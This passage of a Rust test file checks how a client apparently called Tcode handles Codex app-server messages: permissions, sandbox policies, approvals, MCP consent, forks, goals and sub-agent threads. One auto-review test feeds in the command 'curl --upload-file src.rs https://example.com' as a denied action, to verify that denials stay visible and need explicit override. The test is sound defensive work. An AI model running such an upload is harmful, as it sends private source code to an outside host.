use super::*;

/// request_user_input is answered by question id (`{"answers": {<id>:
/// {"answers": [...]}}}`, `protocol/src/request_user_input.rs` at
/// rust-v0.167.0); request_user_input_async asks titles with bare
/// option labels and is answered later (`AsyncUserInputQuestion`,
/// `protocol/src/items.rs`). Content invented.
#[test]
fn a_question_is_what_it_asked_and_the_answers_by_its_id() {
    let asked = question_family(
        "request_user_input",
        &json!({"questions": [{"id": "scope", "header": "Scope", "question": "Which part first?", "options": [{"label": "Sign-in", "description": "Accounts"}, {"label": "Sync, export", "description": "Data"}]}]}),
        Some(r#"{"answers": {"scope": {"answers": ["Sync, export"]}}}"#),
    );
    let Some(ToolFamily::Question { questions }) = asked else {
        panic!("{asked:?}");
    };
    assert_eq!(questions[0].question, "Which part first?");
    assert_eq!(questions[0].answers, ["Sync, export"]);
    let asked = question_family(
        ASYNC_QUESTION_TOOL,
        &json!({"questions": [{"title": "Ship it?", "options": ["Yes", "Not yet"]}]}),
        None,
    );
    let Some(ToolFamily::Question { questions }) = asked else {
        panic!("{asked:?}");
    };
    assert_eq!(
        questions[0]
            .options
            .iter()
            .map(|option| option.label.as_str())
            .collect::<Vec<_>>(),
        ["Yes", "Not yet"]
    );
    assert!(questions[0].answers.is_empty());
}

/// A `CODEX_HOME` the user set in the profile's environment is where the
/// CLI keeps its sign-in and sessions, so it is where Tcode reads them.
#[test]
fn home_dir_follows_a_configured_codex_home() {
    let launch_env = LaunchEnv {
        env: vec![("CODEX_HOME".into(), "/configured".into())],
        home: None,
    };
    assert_eq!(home_dir(&launch_env), Some(PathBuf::from("/configured")));
}

#[test]
fn native_permissions_apply_and_confirm_on_next_turn() {
    smol::block_on(async {
        for (value, policy, reviewer, sandbox) in [
            ("ask", "on-request", "user", Some("workspaceWrite")),
            (
                "auto_review",
                "on-request",
                "auto_review",
                Some("workspaceWrite"),
            ),
            ("read_only", "on-request", "user", Some("readOnly")),
            ("full_access", "never", "user", Some("dangerFullAccess")),
            ("profile:restricted", "on-request", "user", None),
        ] {
            let (mut actor, events) = test_actor();
            actor
                .handle_command(SessionCommand::SetOption {
                    id: "permissions".into(),
                    value: json!(value),
                })
                .await
                .unwrap();
            assert!(
                events.try_recv().is_err(),
                "requested permission must remain pending"
            );
            actor
                .handle_command(SessionCommand::SendTurn {
                    delivery_id: 7,
                    text: "hello".into(),
                    options: None,
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            assert!(matches!(
                events.try_recv().unwrap(),
                AgentEvent::TurnAccepted { delivery_id: 7 }
            ));
            let request = sent(&mut actor).await;
            assert_eq!(request["method"], "turn/start");
            assert_eq!(request["params"]["approvalPolicy"], policy);
            assert_eq!(request["params"]["approvalsReviewer"], reviewer);
            if let Some(sandbox) = sandbox {
                assert_eq!(request["params"]["sandboxPolicy"]["type"], sandbox);
                assert!(request["params"].get("permissions").is_none());
            } else {
                assert_eq!(request["params"]["permissions"], "restricted");
                assert!(request["params"].get("sandboxPolicy").is_none());
            }
            let settings = if let Some(sandbox) = sandbox {
                json!({"approvalPolicy":policy,"approvalsReviewer":reviewer,
                        "sandboxPolicy":{"type":sandbox}})
            } else {
                json!({"approvalPolicy":policy,"approvalsReviewer":reviewer,
                        "activePermissionProfile":{"id":"restricted"}})
            };
            actor
                .handle_line(
                    &json!({"method":"thread/settings/updated", "params":{
                        "threadId":"thread-1", "threadSettings":settings
                    }})
                    .to_string(),
                )
                .await;
            assert!(
                events.try_recv().is_err(),
                "a settings notification before the turn/start reply must keep permission pending"
            );
            actor
                .handle_line(
                    &json!({"id":request["id"], "result":{"turn":{"id":"turn-accepted"}}})
                        .to_string(),
                )
                .await;
            assert!(
                matches!(events.try_recv().unwrap(), AgentEvent::ProviderOptions { selections, .. } if selections == vec![OptionSelection {id:"permissions".into(),value:json!(value)}])
            );
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        }
    });
}

#[test]
fn permission_profile_list_uses_cwd_and_preserves_availability() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        let (tx, rx) = smol::channel::unbounded();
        tx.send(ChildOutput::Line(
            json!({"id":3,"result":{"data":[
                {"id":":workspace","description":null,"allowed":true},
                {"id":"restricted","description":"Only this workspace","allowed":true},
                {"id":"blocked","description":null,"allowed":false}
            ],"nextCursor":null}})
            .to_string(),
        ))
        .await
        .unwrap();
        let profiles = request_permission_profiles(
            Path::new("/workspace"),
            &mut actor.stdin,
            &rx,
            &mut 3,
            &mut Vec::new(),
        )
        .await
        .unwrap();
        let request = sent(&mut actor).await;
        assert_eq!(
            request,
            json!({"id":3,"method":"permissionProfile/list","params":{"cwd":"/workspace","cursor":null}})
        );
        let OptionDescriptor::Select { options, .. } =
            permission_descriptor(&profiles, "ask", &Value::Null)
        else {
            panic!("select")
        };
        assert_eq!(
            options
                .iter()
                .filter(|option| option.value.starts_with("profile:"))
                .map(|option| (
                    &*option.value,
                    option.description.as_deref(),
                    option.unavailable.is_some()
                ))
                .collect::<Vec<_>>(),
            vec![
                ("profile:restricted", Some("Only this workspace"), false),
                ("profile:blocked", None, true)
            ]
        );
        for (settings, label, summary) in [
            (
                json!({"sandboxPolicy":{"type":"workspaceWrite"},"approvalPolicy":"never","approvalsReviewer":"user"}),
                "Current permissions",
                (
                    None,
                    PermissionSandbox::WorkspaceWrite,
                    ApprovalPolicy::Never,
                    ApprovalReviewer::User,
                ),
            ),
            (
                json!({"activePermissionProfile":{"id":"my-team"},"sandboxPolicy":{"type":"workspaceWrite"},"approvalPolicy":"on-request","approvalsReviewer":"user"}),
                "my-team",
                (
                    Some("my-team"),
                    PermissionSandbox::WorkspaceWrite,
                    ApprovalPolicy::OnRequest,
                    ApprovalReviewer::User,
                ),
            ),
            (
                json!({"activePermissionProfile":{"id":"my-team"},"sandboxPolicy":{"type":"readOnly"},"approvalPolicy":"untrusted","approvalsReviewer":"auto_review"}),
                "my-team",
                (
                    Some("my-team"),
                    PermissionSandbox::ReadOnly,
                    ApprovalPolicy::Untrusted,
                    ApprovalReviewer::AutoReview,
                ),
            ),
            (
                json!({"sandboxPolicy":{"type":"externalSandbox","networkAccess":"restricted"},"approvalPolicy":{"granular":{"sandbox_approval":false,"rules":true,"skill_approval":true,"request_permissions":true,"mcp_elicitations":true}},"approvalsReviewer":"guardian_subagent"}),
                "Current permissions",
                (
                    None,
                    PermissionSandbox::External,
                    ApprovalPolicy::Granular,
                    ApprovalReviewer::AutoReview,
                ),
            ),
            (
                json!({"sandboxPolicy":{"type":"dangerFullAccess"},"approvalPolicy":"on-request","approvalsReviewer":"user"}),
                "Current permissions",
                (
                    None,
                    PermissionSandbox::FullAccess,
                    ApprovalPolicy::OnRequest,
                    ApprovalReviewer::User,
                ),
            ),
        ] {
            actor.handle_line(&json!({"method":"thread/settings/updated","params":{"threadId":"thread-1","threadSettings":settings}}).to_string()).await;
            let AgentEvent::ProviderOptions {
                descriptors,
                selections,
            } = events.try_recv().unwrap()
            else {
                panic!("confirmed permissions")
            };
            let OptionDescriptor::Select { options, .. } = &descriptors[0] else {
                panic!("select")
            };
            let selected = options
                .iter()
                .find(|option| json!(option.value) == selections[0].value)
                .unwrap();
            let (profile, sandbox, approval, reviewer) = summary;
            assert_eq!(selected.label, label);
            assert_eq!(selected.description, None);
            assert_eq!(
                selected.summary,
                Some(PermissionSummary {
                    profile: profile.map(str::to_owned),
                    sandbox: Some(sandbox),
                    approval: Some(approval),
                    reviewer: Some(reviewer),
                })
            );
            assert!(selected.unavailable.is_some());
            // The model, effort and tier the notification also carries.
            while events.try_recv().is_ok() {}
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// Codex 0.167.0 settles its own open requests when their turn ends or is
/// interrupted and says so with `serverRequest/resolved` (`v2/ServerRequestResolvedNotification.ts`;
/// `abort_pending_server_requests` and `resolve_server_request` in
/// `codex-rs/app-server` at `rust-v0.167.0`). It also follows an answer
/// Tcode gave, which is then already settled.
#[test]
fn requests_codex_settles_itself_are_reported_resolved() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
                .handle_line(&json!({"id":7,"method":"item/commandExecution/requestApproval","params":{
                    "kind":"command","threadId":"thread-1","turnId":"turn-1","itemId":"cmd-1","startedAtMs":1,
                    "environmentId":null,"command":"cargo test","cwd":"/workspace"
                }}).to_string())
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ApprovalRequested(ref request) if request.id == "7"
        ));
        actor
                .handle_line(&json!({"id":"q-8","method":"item/tool/requestUserInput","params":{
                    "threadId":"thread-1","turnId":"turn-1","itemId":"ask-1","isBlocking":true,"autoResolutionMs":null,
                    "questions":[{"id":"db","header":"DB","question":"Which DB?","isOther":false,"isSecret":false,"options":null}]
                }}).to_string())
                .await;
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputRequested { ref request_id, .. } if request_id == "q-8"
        ));
        for request_id in [json!(7), json!("q-8")] {
            actor
                    .handle_line(
                        &json!({"method":"serverRequest/resolved","params":{"threadId":"thread-1","requestId":request_id}})
                            .to_string(),
                    )
                    .await;
        }
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::ApprovalResolved { ref request_id, decision: ApprovalDecision::Cancel }
                if request_id == "7"
        ));
        assert!(matches!(
            events.try_recv().unwrap(),
            AgentEvent::UserInputResolved { ref request_id, ref answers }
                if request_id == "q-8" && answers.is_empty()
        ));
        actor
                .handle_line(
                    r#"{"method":"serverRequest/resolved","params":{"threadId":"thread-1","requestId":7}}"#,
                )
                .await;
        assert!(events.try_recv().is_err());
        assert!(
            written(&mut actor).await.is_empty(),
            "Codex is not answered"
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn permission_requests_reply_with_native_grants_and_cancel_aborts() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor.handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-1"}}}"#).await;
        let _ = events.try_recv().unwrap();
        for (rpc_id, decision, expected) in [
            (
                90,
                ApprovalDecision::Option("session".into()),
                json!({"permissions":{"network":{"enabled":true}},"scope":"session"}),
            ),
            (
                91,
                ApprovalDecision::Cancel,
                json!({"permissions":{},"scope":"turn"}),
            ),
        ] {
            actor.handle_line(&json!({"id":rpc_id,"method":"item/permissions/requestApproval","params":{
                    "threadId":"thread-child","turnId":"turn-child","itemId":"permissions-1","environmentId":null,"startedAtMs":1,"cwd":"/workspace","reason":"Access network","permissions":{"network":{"enabled":true},"fileSystem":null}
                }}).to_string()).await;
            let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
                panic!("native permission request")
            };
            assert_eq!(
                request
                    .options
                    .iter()
                    .map(|option| option.id.as_str())
                    .collect::<Vec<_>>(),
                vec!["turn", "session", "decline"]
            );
            assert!(written(&mut actor).await.is_empty());
            actor
                .handle_command(SessionCommand::RespondApproval {
                    request_id: request.id,
                    decision,
                })
                .await
                .unwrap();
            let mut sent = written(&mut actor).await.into_iter();
            assert_eq!(sent.next(), Some(json!({"id":rpc_id,"result":expected})));
            assert!(matches!(
                events.try_recv().unwrap(),
                AgentEvent::ApprovalResolved { .. }
            ));
            if rpc_id == 91 {
                let request = sent.next().unwrap();
                assert_eq!(request["method"], "turn/interrupt");
                assert_eq!(
                    request["params"],
                    json!({"threadId":"thread-child","turnId":"turn-child"})
                );
            }
            assert_eq!(sent.next(), None);
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn mcp_tool_consent_uses_native_options_without_preapproval() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor.handle_line(r#"{"method":"mcpServer/elicitation/request","id":0,"params":{"threadId":"thread-1","turnId":"turn-1","serverName":"tcode_control","mode":"form","_meta":{"codex_approval_kind":"mcp_tool_call","persist":["session","always"],"tool_description":"Harmless permission probe: return PONG.","tool_params":{},"tool_params_display":[]},"message":"Allow the tcode_control MCP server to run tool \"probe\"?","requestedSchema":{"type":"object","properties":{}}}}"#).await;
        let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
            panic!("MCP consent")
        };
        assert_eq!(
            request
                .options
                .iter()
                .map(|option| option.id.as_str())
                .collect::<Vec<_>>(),
            vec!["accept", "accept:session", "accept:always", "decline"]
        );
        assert!(
            written(&mut actor).await.is_empty(),
            "consent must wait for the user"
        );
        actor
            .handle_command(SessionCommand::RespondApproval {
                request_id: request.id,
                decision: ApprovalDecision::Option("accept:session".into()),
            })
            .await
            .unwrap();
        assert_eq!(
            sent(&mut actor).await,
            json!({"id":0,"result":{"action":"accept","content":{},"_meta":{"persist":"session"}}})
        );
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn auto_review_denial_is_visible_and_only_explicitly_overridden() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor.handle_line(&json!({"method":"item/autoApprovalReview/started","params":{
                "threadId":"thread-child","turnId":"turn-1","reviewId":"review-1","targetItemId":"command-1",
                "review":{"status":"inProgress","riskLevel":null,"rationale":null},
                "action":{"type":"command","command":"curl --upload-file src.rs https://example.com","cwd":"/workspace"}
            }}).to_string()).await;
        let AgentEvent::ItemStarted(item) = events.try_recv().unwrap() else {
            panic!("running review in the timeline")
        };
        assert_eq!(item.id, "review-1");
        assert_eq!(item.parent_item_id, None);
        assert!(
            matches!(item.content, ItemContent::ToolCall { name, input, output:None, status:ItemStatus::InProgress, .. }
                if name == "Auto-reviewer" && input == json!({"summary":"Command: curl --upload-file src.rs https://example.com","targetItemId":"command-1"}))
        );
        actor.handle_line(&json!({"method":"item/autoApprovalReview/completed","params":{
                "threadId":"thread-child","turnId":"turn-1","reviewId":"review-1","targetItemId":"command-1","startedAtMs":1,"completedAtMs":2,"decisionSource":"agent",
                "review":{"status":"denied","riskLevel":"high","userAuthorization":"low","rationale":"Uploads local source"},
                "action":{"type":"execve","source":"unifiedExec","program":"applyPatch","argv":["inProgress","unifiedExec"],"cwd":"/workspace"}
            }}).to_string()).await;
        let AgentEvent::ItemCompleted(item) = events.try_recv().unwrap() else {
            panic!("failed review in the timeline")
        };
        assert_eq!(item.id, "review-1");
        assert!(
            matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::Failed, .. }
                if name == "Auto-reviewer" && input == json!({"summary":"Command: applyPatch inProgress unifiedExec","targetItemId":"command-1","risk":"high"})
                && detail == "Uploads local source")
        );
        let AgentEvent::ApprovalRequested(request) = events.try_recv().unwrap() else {
            panic!("explicit guardian override")
        };
        assert_eq!(request.options[0].id, "thread/approveGuardianDeniedAction");
        assert!(written(&mut actor).await.is_empty());
        actor
            .handle_command(SessionCommand::RespondApproval {
                request_id: request.id.clone(),
                decision: ApprovalDecision::Option(request.options[0].id.clone()),
            })
            .await
            .unwrap();
        let native = sent(&mut actor).await;
        assert_eq!(native["method"], "thread/approveGuardianDeniedAction");
        assert_eq!(
            native["params"],
            json!({"threadId":"thread-child","event":{
                "id":"review-1","turn_id":"turn-1","target_item_id":"command-1","started_at_ms":1,"completed_at_ms":2,"decision_source":"agent","status":"denied","risk_level":"high","user_authorization":"low","rationale":"Uploads local source",
                "action":{"type":"execve","source":"unified_exec","program":"applyPatch","argv":["inProgress","unifiedExec"],"cwd":"/workspace"}
            }})
        );
        actor
            .handle_line(&json!({"id":native["id"],"result":{}}).to_string())
            .await;
        assert!(
            matches!(events.try_recv().unwrap(),AgentEvent::ApprovalResolved {request_id,..} if request_id==request.id)
        );
        for (review_status, expected_status, action, summary) in [
            (
                "approved",
                ItemStatus::Completed,
                json!({"type":"command","command":"pwd","cwd":"/workspace"}),
                "Command: pwd",
            ),
            (
                "timedOut",
                ItemStatus::Failed,
                json!({"type":"applyPatch","cwd":"/workspace","files":["src.rs","Cargo.toml"]}),
                "Patch files: src.rs, Cargo.toml",
            ),
            (
                "aborted",
                ItemStatus::Failed,
                json!({"type":"networkAccess","target":"https://example.com","host":"example.com","protocol":"https","port":443}),
                "Network target: https://example.com (example.com:443 via https)",
            ),
            (
                "approved",
                ItemStatus::Completed,
                json!({"type":"mcpToolCall","server":"tcode_control","toolName":"report_result"}),
                "MCP tool: tcode_control/report_result",
            ),
            (
                "approved",
                ItemStatus::Completed,
                json!({"type":"requestPermissions","reason":"Read shared files","permissions":{"network":{"enabled":true},"fileSystem":{"read":["/shared"],"write":["/output"],"entries":[{"path":{"type":"glob_pattern","pattern":"/cache/**"},"access":"read"}]}}}),
                "Requested permissions: network access; read: /shared; write: /output; read: /cache/** (Read shared files)",
            ),
            (
                "approved",
                ItemStatus::Completed,
                json!({"type":"writeStdin","processId":"42","stdin":"yes\n","cwd":"/workspace"}),
                "Input to process 42: yes\n",
            ),
        ] {
            actor.handle_line(&json!({"method":"item/autoApprovalReview/completed","params":{
                    "threadId":"thread-1","reviewId":"review-2","targetItemId":"action-2",
                    "review":{"status":review_status,"riskLevel":"low","rationale":"Routine action"},"action":action
                }}).to_string()).await;
            let AgentEvent::ItemCompleted(item) = events.try_recv().unwrap() else {
                panic!("terminal review")
            };
            assert_eq!(item.id, "review-2");
            assert!(
                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status, .. }
                    if name == "Auto-reviewer" && status == expected_status && input["summary"] == summary
                    && input["targetItemId"] == "action-2" && input["risk"] == "low" && detail == "Routine action")
            );
            assert!(
                events.try_recv().is_err(),
                "only denied reviews offer an override"
            );
            assert!(
                written(&mut actor).await.is_empty(),
                "a verdict does not approve an action"
            );
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// A fork before a turn is `thread/fork` with `beforeTurnId`, which
/// `v2/ThreadForkParams.ts` of 0.167.0 defines as "fork before, excluding
/// that turn and all later turns"; ChatGPT.app 26.1103 sends it the same way.
#[test]
fn fork_request_uses_native_method_and_resume_thread_id() {
    let resume = ResumeCursor(json!({"thread_id": "thread-source"}));
    let (method, params) = resume_request(&resume, Some(&ForkPoint::Tail), "/workspace").unwrap();
    assert_eq!(method, "thread/fork");
    assert_eq!(
        params,
        json!({"threadId": "thread-source", "cwd": "/workspace"})
    );

    let before = ForkPoint::Before {
        checkpoint_id: "turn-2".into(),
    };
    let (method, params) = resume_request(&resume, Some(&before), "/workspace").unwrap();
    assert_eq!(method, "thread/fork");
    assert_eq!(
        params,
        json!({"threadId": "thread-source", "cwd": "/workspace", "beforeTurnId": "turn-2"})
    );

    let (method, _) = resume_request(&resume, None, "/workspace").unwrap();
    assert_eq!(method, "thread/resume");
}

#[test]
fn selected_context_window_rides_thread_config() {
    assert_eq!(thread_config(&[]), None);
    let selections = [
        OptionSelection {
            id: "serviceTier".into(),
            value: json!("flex"),
        },
        OptionSelection {
            id: "contextWindow".into(),
            value: json!("500k"),
        },
    ];
    assert_eq!(
        thread_config(&selections),
        Some(json!({ "model_context_window": 500_000 }))
    );
}

#[test]
fn mcp_builder_handles_both_one_and_none() {
    let registrations = [
        crate::McpRegistration {
            name: "tcode_preview".into(),
            url: "http://p".into(),
            bearer_token: "p".into(),
        },
        crate::McpRegistration {
            name: "tcode_control".into(),
            url: "http://o".into(),
            bearer_token: "o".into(),
        },
        crate::McpRegistration {
            name: "tcode_computer_use".into(),
            url: "http://c".into(),
            bearer_token: "c".into(),
        },
    ];
    for count in [0, 1, 3] {
        let args = mcp_args(&registrations[..count]);
        assert_eq!(args.len(), count * 2);
        for (arg, (key, url, authorization)) in args.as_chunks::<2>().0.iter().zip([
            ("mcp_servers.tcode_preview", "http://p", "Bearer p"),
            ("mcp_servers.tcode_control", "http://o", "Bearer o"),
            ("mcp_servers.tcode_computer_use", "http://c", "Bearer c"),
        ]) {
            assert_eq!(arg[0], "-c");
            let (actual_key, value) = arg[1].split_once('=').unwrap();
            assert_eq!(actual_key, key);
            let doc: toml::Value = toml::from_str(&format!("v = {value}")).unwrap();
            let table = &doc["v"];
            assert_eq!(table["url"].as_str(), Some(url));
            assert_eq!(
                table["http_headers"]["Authorization"].as_str(),
                Some(authorization)
            );
            // Nothing else: no `bearer_token`, which Codex refuses for
            // HTTP, and no key that approves the server's tools ahead.
            assert_eq!(
                table.as_table().unwrap().keys().collect::<Vec<_>>(),
                ["http_headers", "url"]
            );
        }
    }
}

fn test_actor() -> (Actor, Receiver<AgentEvent>) {
    let mut child = crate::process::test_echo_command()
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    let stdin = BufWriter::new(child.stdin.take().unwrap());
    let stdout = child.stdout.take().unwrap();
    let (line_tx, line_rx) = smol::channel::unbounded();
    std::thread::spawn(move || {
        let mut ready = false;
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if !ready {
                ready = line == crate::process::TEST_ECHO_READY;
                continue;
            }
            if line_tx.send_blocking(ChildOutput::Line(line)).is_err() {
                return;
            }
        }
    });
    let (event_tx, event_rx) = smol::channel::unbounded();
    (
        Actor {
            clock: crate::Clock::default(),
            child: ProcessTree::new(child),
            stderr_tail: StderrTail::default(),
            stdin,
            lines: line_rx,
            events: event_tx,
            thread_id: "thread-1".into(),
            cwd: std::env::temp_dir(),
            model: "gpt-5-codex".into(),
            default_model: "gpt-5-codex".into(),
            effort: None,
            config_effort: None,
            model_efforts: ModelEfforts::default(),
            service_tier: None,
            thread_config: None,
            requested_permission: "ask".into(),
            effective_permission: "ask".into(),
            permission_descriptor: permission_descriptor(&[], "ask", &Value::Null),
            next_id: 1,
            pending_requests: HashMap::new(),
            approvals: HashMap::new(),
            guardian_denials: HashMap::new(),
            user_inputs: HashMap::new(),
            elicitations: HashMap::new(),
            async_questions: None,
            items: HashMap::new(),
            subagents: HashMap::new(),
            backgrounded_subagents: HashSet::new(),
            background_terminals: Vec::new(),
            stopped_commands: HashSet::new(),
            terminal_input: HashMap::new(),
            background_terminal_read: None,
            subagent_parent_by_thread: HashMap::new(),
            seen_subagent_activities: HashSet::new(),
            pending_steers: Vec::new(),
            usage_by_turn: HashMap::new(),
            active_turn: None,
            retry: None,
            last_turn_options: None,
            interrupted: false,
            moved_to: None,
            instructions: None,
            continuing: false,
            continuations: HashSet::new(),
            config_warnings: HashSet::new(),
        },
        event_rx,
    )
}

/// Everything Tcode wrote to Codex since the last call, in order. The
/// echo child returns lines in the order they were written, so a marker
/// written now comes back after all of them.
async fn written(actor: &mut Actor) -> Vec<Value> {
    let marker = json!({"tcode_test_marker": true});
    send_json(&mut actor.stdin, &marker).unwrap();
    let mut written = Vec::new();
    loop {
        let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
            panic!("the echo child stopped");
        };
        let message: Value = serde_json::from_str(&line).unwrap();
        if message == marker {
            return written;
        }
        written.push(message);
    }
}

/// The one message Tcode wrote to Codex since the last read.
async fn sent(actor: &mut Actor) -> Value {
    let written = written(actor).await;
    let [message] = <[Value; 1]>::try_from(written)
        .unwrap_or_else(|written| panic!("expected one message, got {written:?}"));
    message
}

/// A moved thread's next `turn/start` names the directory it moved to, and so does
/// every one after it until Codex starts a turn there: a refused request moved nothing.
#[test]
fn a_move_rides_turn_start_until_codex_starts_a_turn_there() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        actor
            .handle_command(SessionCommand::MoveTo {
                cwd: PathBuf::from("/work/feature"),
            })
            .await
            .unwrap();
        let turn_start = async |actor: &mut Actor, delivery_id| {
            actor
                .handle_command(SessionCommand::SendTurn {
                    delivery_id,
                    text: "go on".into(),
                    options: None,
                    attachments: Vec::new(),
                })
                .await
                .unwrap();
            // A refused request's failure reports come first.
            while !matches!(events.try_recv().unwrap(), AgentEvent::TurnAccepted { .. }) {}
            sent(actor).await
        };
        let refused = turn_start(&mut actor, 1).await;
        assert_eq!(
            refused,
            json!({"id":1,"method":"turn/start","params":{
                "threadId":"thread-1",
                "input":[{"type":"text","text":"go on","text_elements":[]}],
                "approvalPolicy":"on-request",
                "approvalsReviewer":"user",
                "sandboxPolicy":{
                    "type":"workspaceWrite","writableRoots":[],"networkAccess":false,
                    "excludeTmpdirEnvVar":false,"excludeSlashTmp":false
                },
                "cwd":"/work/feature",
                "collaborationMode":{"mode":"default","settings":{
                    "model":"gpt-5-codex","reasoning_effort":"medium",
                    "developer_instructions":null
                }}
            }})
        );
        actor
            .handle_line(r#"{"id":1,"error":{"code":-32600,"message":"busy"}}"#)
            .await;
        let accepted = turn_start(&mut actor, 2).await;
        assert_eq!(accepted["params"]["cwd"], "/work/feature");
        actor
            .handle_line(r#"{"id":2,"result":{"turn":{"id":"turn-2"}}}"#)
            .await;
        let after = turn_start(&mut actor, 3).await;
        assert!(after["params"].get("cwd").is_none(), "{after}");
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn child_thread_lifecycle_preserves_parent_steer_and_interrupt() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        // The child's turn ends before the parent's does.
        for (method, thread, turn) in [
            ("turn/started", "thread-1", json!({"id":"T1"})),
            ("turn/started", "thread_child", json!({"id":"T2"})),
            (
                "turn/completed",
                "thread_child",
                json!({"id":"T2", "status":"completed"}),
            ),
        ] {
            actor
                .handle_line(
                    &json!({"method":method, "params":{"threadId":thread, "turn":turn}})
                        .to_string(),
                )
                .await;
        }
        assert!(
            matches!(events.try_recv().unwrap(), AgentEvent::TurnStarted { turn_id } if turn_id == "T1")
        );
        assert!(events.try_recv().is_err());
        for (command, method, field) in [
            (
                SessionCommand::Steer {
                    request_id: "steer".into(),
                    text: "redirect".into(),
                    attachments: Vec::new(),
                },
                "turn/steer",
                Some("expectedTurnId"),
            ),
            (SessionCommand::Interrupt, "turn/interrupt", Some("turnId")),
            (SessionCommand::Compact, "thread/compact/start", None),
        ] {
            actor.handle_command(command).await.unwrap();
            let request = sent(&mut actor).await;
            assert_eq!(request["method"], method);
            assert_eq!(request["params"]["threadId"], "thread-1");
            if let Some(field) = field {
                assert_eq!(request["params"][field], "T1");
            }
        }
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

/// Shapes from the 0.164.0 app-server schema (`ThreadGoalSetParams`,
/// `ThreadGoalUpdatedNotification`, `ThreadGoalClearedNotification`).
#[test]
fn goal_commands_and_notifications_use_the_thread_goal_wire() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for (command, expected) in [
            (
                SessionCommand::SetGoal {
                    objective: Some("Ship the goal strip".into()),
                    status: None,
                },
                json!({"method":"thread/goal/set", "params":{
                    "threadId":"thread-1", "origin":"user", "objective":"Ship the goal strip"
                }}),
            ),
            (
                SessionCommand::SetGoal {
                    objective: None,
                    status: Some(GoalStatus::Paused),
                },
                json!({"method":"thread/goal/set", "params":{
                    "threadId":"thread-1", "origin":"user", "status":"paused"
                }}),
            ),
            (
                SessionCommand::ClearGoal,
                json!({"method":"thread/goal/clear", "params":{
                    "threadId":"thread-1", "origin":"user"
                }}),
            ),
        ] {
            actor.handle_command(command).await.unwrap();
            let request = sent(&mut actor).await;
            assert_eq!(request["method"], expected["method"]);
            assert_eq!(request["params"], expected["params"]);
        }
        let goal = json!({
            "threadId":"thread-1", "objective":"Ship the goal strip", "status":"budgetLimited",
            "tokenBudget":50000, "tokensUsed":63876, "timeUsedSeconds":120,
            "createdAt":1, "updatedAt":2
        });
        for line in [
            json!({"method":"thread/goal/updated", "params":{
                "threadId":"thread_child", "turnId":null, "goal":goal
            }}),
            json!({"method":"thread/goal/updated", "params":{
                "threadId":"thread-1", "turnId":"T1", "goal":goal
            }}),
            json!({"method":"thread/goal/cleared", "params":{"threadId":"thread-1"}}),
        ] {
            actor.handle_line(&line.to_string()).await;
        }
        assert_eq!(
            events.try_recv().unwrap(),
            AgentEvent::GoalUpdated {
                goal: Some(Goal {
                    objective: "Ship the goal strip".into(),
                    status: GoalStatus::BudgetLimited,
                    tokens_used: Some(63876),
                    token_budget: Some(50000),
                    time_used_secs: Some(120),
                    checks: None,
                    last_check: None,
                })
            }
        );
        assert_eq!(
            events.try_recv().unwrap(),
            AgentEvent::GoalUpdated { goal: None }
        );
        assert!(events.try_recv().is_err());
        let _ = actor.child.kill();
        let _ = actor.child.wait();
    });
}

#[test]
fn child_thread_items_route_to_known_or_synthetic_parent() {
    smol::block_on(async {
        for known in [true, false] {
            let (mut actor, events) = test_actor();
            if known {
                actor.handle_line(&json!({"method":"item/started", "params":{
                        "threadId":"thread_child", "item":{"type":"subAgentActivity", "id":"spawn",
                        "agentThreadId":"thread_child", "kind":"started"}
                    }}).to_string()).await;
                while events.try_recv().is_ok() {}
            }
            let parent = if known {
                "spawn"
            } else {
                "codex-subagent:thread_child"
            };
            for method in ["item/started", "item/updated", "item/completed"] {
                // An id that collides with its parent's does not take the parent's content.
                actor.handle_line(&json!({"method":method, "params":{
                        "threadId":"thread_child", "item":{"type":"agentMessage", "id":"spawn", "text":"child reply"}
                    }}).to_string()).await;
                let event = events.try_recv().unwrap();
                let item = match (method, event) {
                    ("item/started", AgentEvent::ItemStarted(item))
                    | ("item/updated", AgentEvent::ItemUpdated(item))
                    | ("item/completed", AgentEvent::ItemCompleted(item)) => item,
                    (_, event) => panic!("unexpected event: {event:?}"),
                };
                assert_eq!(item.parent_item_id.as_deref(), Some(parent));
                assert!(
                    matches!(item.content, ItemContent::AssistantMessage { text, .. } if text == "child reply")
                );
                assert!(events.try_recv().is_err());
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        }
    });
}

#[test]
fn child_thread_deltas_and_parent_only_updates_are_ignored() {
    smol::block_on(async {
        let (mut actor, events) = test_actor();
        for method in [
            "item/agentMessage/delta",
            "item/reasoning/summaryTextDelta",
            "item/reasoning/textDelta",
            "item/commandExecution/outputDelta",
            "command/exec/outputDelta",
            "item/plan/delta",
            "turn/diff/updated",
            "turn/plan/updated",
            "thread/tokenUsage/updated",
        ] {
